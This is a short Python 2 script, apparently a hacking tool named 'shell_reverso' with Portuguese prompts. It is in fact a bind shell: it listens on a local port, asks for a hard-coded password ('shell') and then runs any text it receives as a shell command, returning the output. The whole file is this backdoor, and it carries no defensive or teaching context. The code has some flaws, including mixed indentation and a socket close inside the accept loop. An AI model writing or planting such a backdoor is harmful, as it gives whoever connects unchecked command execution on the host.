#!/usr/bin/python
#author: ren - shell_reverso
import socket,subprocess

ms = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ms.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
ms.bind(('127.0.0.1',5050))
ms.listen(2)

while True:
	conn, addr = ms.accept()
	print '[+] conexao aceita de %s:%d' %(addr[0],addr[1])
	conn.send('senha:')
	r = conn.recv(1024)
	if r == 'shell\n':
		while True:
			conn.send('>>> ')
			data = conn.recv(1024)
			if data == 'quit\n':
				break
			bash = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			stdout_value = bash.communicate()
     			conn.send(stdout_value[0])
	else:
		conn.send('senha incorreta\n')
		ms.close()
	ms.close()
	
